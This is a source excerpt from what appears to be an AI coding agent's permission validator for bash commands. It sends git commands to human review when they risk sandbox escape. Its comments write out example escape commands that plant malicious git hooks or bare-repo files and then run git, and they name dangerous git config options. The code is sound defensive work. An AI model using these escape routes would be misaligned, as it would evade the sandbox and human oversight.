      // Prevent git commands with -c flag to avoid config options that can lead to code execution
      // The -c flag allows setting arbitrary git config values inline, including dangerous ones like
      // core.fsmonitor, diff.external, core.gitProxy, etc. that can execute arbitrary commands
      // Check for -c preceded by whitespace and followed by whitespace or equals
      // Using regex to catch spaces, tabs, and other whitespace (not part of other flags like --cached)
      if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
        return false
      }

      // Prevent git commands with --exec-path flag to avoid path manipulation that can lead to code execution
      // The --exec-path flag allows overriding the directory where git looks for executables
      if (
        testCommand.includes('git') &&
        /\s--exec-path[\s=]/.test(testCommand)
      ) {
        return false
      }

      // Prevent git commands with --config-env flag to avoid config injection via environment variables
      // The --config-env flag allows setting git config values from environment variables, which can be
      // just as dangerous as -c flag (e.g., core.fsmonitor, diff.external, core.gitProxy)
      if (
        testCommand.includes('git') &&
        /\s--config-env[\s=]/.test(testCommand)
      ) {
        return false
      }
      return true
    }
  }
  return false
}

/**
 * Checks if a compound command contains any git command.
 *
 * @param command The full command string to check
 * @returns true if any subcommand is a git command
 */
function commandHasAnyGit(command: string): boolean {
  return splitCommand_DEPRECATED(command).some(subcmd =>
    isNormalizedGitCommand(subcmd.trim()),
  )
}

/**
 * Git-internal path patterns that can be exploited for sandbox escape.
 * If a command creates these files and then runs git, the git command
 * could execute malicious hooks from the created files.
 */
// GIT_INTERNAL_PATTERNS 是沙箱逃逸的钥匙：HEAD/objects/refs/hooks 一旦在命令里被创建，git 会把当前目录当 git 目录并从 hooks 执行恶意代码。
const GIT_INTERNAL_PATTERNS = [
  /^HEAD$/,
  /^objects(?:\/|$)/,
  /^refs(?:\/|$)/,
  /^hooks(?:\/|$)/,
]

/**
 * Checks if a path is a git-internal path (HEAD, objects/, refs/, hooks/).
 */
function isGitInternalPath(path: string): boolean {
  // Normalize path by removing leading ./ or /
  const normalized = path.replace(/^\.?\//, '')
  return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
}

// Commands that only delete or modify in-place (don't create new files at new paths)
// rm/rmdir/sed 只删或原地改，不在新路径创建文件，所以 git 内部路径检查排除它们。
const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])

/**
 * Extracts write paths from a subcommand using PATH_EXTRACTORS.
 * Only returns paths for commands that can create new files/directories
 * (write/create operations excluding deletion and in-place modification).
 */
function extractWritePathsFromSubcommand(subcommand: string): string[] {
  const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
  if (!parseResult.success) return []

  const tokens = parseResult.tokens.filter(
    (t): t is string => typeof t === 'string',
  )
  if (tokens.length === 0) return []

  const baseCmd = tokens[0]
  if (!baseCmd) return []

  // Only consider commands that can create files at target paths
  if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
    return []
  }
  const opType = COMMAND_OPERATION_TYPE[baseCmd as PathCommand]
  if (
    (opType !== 'write' && opType !== 'create') ||
    NON_CREATING_WRITE_COMMANDS.has(baseCmd)
  ) {
    return []
  }

  const extractor = PATH_EXTRACTORS[baseCmd as PathCommand]
  if (!extractor) return []

  return extractor(tokens.slice(1))
}

/**
 * Checks if a compound command writes to any git-internal paths.
 * This is used to detect potential sandbox escape attacks where a command
 * creates git-internal files (HEAD, objects/, refs/, hooks/) and then runs git.
 *
 * SECURITY: A compound command could bypass the bare repo detection by:
 * 1. Creating bare git repo files (HEAD, objects/, refs/, hooks/) in the same command
 * 2. Then running git, which would execute malicious hooks
 *
 * Example attack:
 * mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
 *
 * @param command The full command string to check
 * @returns true if any subcommand writes to git-internal paths
 */
// commandWritesToGitInternalPaths 防的是一条龙攻击：mkdir -p hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && git status。拆命令逐个查写路径（mkdir/touch/cp/mv 用 PATH_EXTRACTORS）加重定向目标。
function commandWritesToGitInternalPaths(command: string): boolean {
  const subcommands = splitCommand_DEPRECATED(command)

  for (const subcmd of subcommands) {
    const trimmed = subcmd.trim()

    // Check write paths from path-based commands (mkdir, touch, cp, mv)
    const writePaths = extractWritePathsFromSubcommand(trimmed)
    for (const path of writePaths) {
      if (isGitInternalPath(path)) {
        return true
      }
    }

    // Check output redirections (e.g., echo x > hooks/pre-commit)
    const { redirections } = extractOutputRedirections(trimmed)
    for (const { target } of redirections) {
      if (isGitInternalPath(target)) {
        return true
      }
    }
  }

  return false
}

/**
 * Checks read-only constraints for bash commands.
 * This is the single exported function that validates whether a command is read-only.
 * It handles compound commands, sandbox mode, and safety checks.
 *
 * @param input The bash command input to validate
 * @param compoundCommandHasCd Pre-computed flag indicating if any cd command exists in the compound command.
 *                              This is computed by commandHasAnyCd() and passed in to avoid duplicate computation.
 * @returns PermissionResult indicating whether the command is read-only
 */
// checkReadOnlyConstraints 是 readOnlyValidation.ts 对外的总出口，返回 PermissionResult。参数 compoundCommandHasCd 由调用方预算好，避免重复计算。
export function checkReadOnlyConstraints(
  input: z.infer<typeof BashTool.inputSchema>,
  compoundCommandHasCd: boolean,
): PermissionResult {
  const { command } = input

  // Detect if the command is not parseable and return early
// 解析不了 → passthrough（不是 deny）：交给后续权限检查处理，fail-open 到人工。
  const result = tryParseShellCommand(command, env => `$${env}`)
  if (!result.success) {
    return {
      behavior: 'passthrough',
      message: 'Command cannot be parsed, requires further permission checks',
    }
  }

  // Check the original command for safety before splitting
  // This is important because splitCommand_DEPRECATED may transform the command
  // (e.g., ${VAR} becomes $VAR)
// 先在完整命令上跑一次 bashCommandIsSafe_DEPRECATED——splitCommand 会变换命令（${VAR} → $VAR），有些危险只在原文里可见。
  if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
    return {
      behavior: 'passthrough',
      message: 'Command is not read-only, requires further permission checks',
    }
  }

  // Check for Windows UNC paths in the original command before transformation
  // This must be done before splitCommand_DEPRECATED because splitCommand_DEPRECATED may transform backslashes
// UNC 检查在 splitCommand 之前做：splitCommand 会变换反斜杠（Windows 路径分隔符），之后再查就认不出了。
  if (containsVulnerableUncPath(command)) {
    return {
      behavior: 'ask',
      message:
        'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
    }
  }

  // Check once if any subcommand is a git command (used for multiple security checks below)
  const hasGitCommand = commandHasAnyGit(command)

  // SECURITY: Block compound commands that have both cd AND git
  // This prevents sandbox escape via: cd /malicious/dir && git status
  // where the malicious directory contains fake git hooks that execute arbitrary code.
// cd + git 组合直接转人工：恶意目录放假 git hooks，cd 进去再跑 git 就执行了。
  if (compoundCommandHasCd && hasGitCommand) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands with cd and git require permission checks for enhanced security',
    }
  }

  // SECURITY: Block git commands if the current directory looks like a bare/exploited git repo
  // This prevents sandbox escape when an attacker has:
  // 1. Deleted .git/HEAD to invalidate the normal git directory
  // 2. Created hooks/pre-commit or other git-internal files in the current directory
  // Git would then treat the cwd as the git directory and execute malicious hooks.
// 当前目录像 bare/被掏空的 git 仓库时（.git/HEAD 被删、hooks/pre-commit 被放），git 命令一律转人工。
  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands in directories with bare repository structure require permission checks for enhanced security',
    }
  }

  // SECURITY: Block compound commands that write to git-internal paths AND run git
  // This prevents sandbox escape where a command creates git-internal files
  // (HEAD, objects/, refs/, hooks/) and then runs git, which would execute
  // malicious hooks from the newly created files.
  // Example attack: mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
// 命令里同时「创建 git 内部文件」和「跑 git」→ 转人工。这是上面 mkdir hooks 攻击的对应拦截。
  if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands that create git internal files and run git require permission checks for enhanced security',
    }
  }

  // SECURITY: Only auto-allow git commands as read-only if we're in the original cwd
  // (which is protected by sandbox denyWrite) or if sandbox is disabled (attack is moot).
  // Race condition: a sandboxed command can create bare repo files in a subdirectory,
  // and a backgrounded git command (e.g. sleep 10 && git status) would pass the
  // isCurrentDirectoryBareGitRepo() check at evaluation time before the files exist.
// 竞态窗口的封堵：沙箱命令能在子目录造 bare repo 文件，而后台 git（sleep 10 && git status）在评估时文件还不存在，bare-repo 检查漏过。所以只要沙箱开着且当前目录不是原 cwd，git 命令就转人工。
  if (
    hasGitCommand &&
    SandboxManager.isSandboxingEnabled() &&
    getCwd() !== getOriginalCwd()
  ) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands outside the original working directory require permission checks when sandbox is enabled',
    }
  }

  // Check if all subcommands are read-only
// 全部子命令只读 → allow（updatedInput 原样带回）；否则 passthrough 让 bashPermissions 等其他检查接手。
  const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
    subcmd => {
      if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
        return false
      }
      return isCommandReadOnly(subcmd)
    },
  )

  if (allSubcommandsReadOnly) {
    return {
      behavior: 'allow',
      updatedInput: input,
    }
  }

  // If not read-only, return passthrough to let other permission checks handle it
  return {
    behavior: 'passthrough',
    message: 'Command is not read-only, requires further permission checks',
  }
}
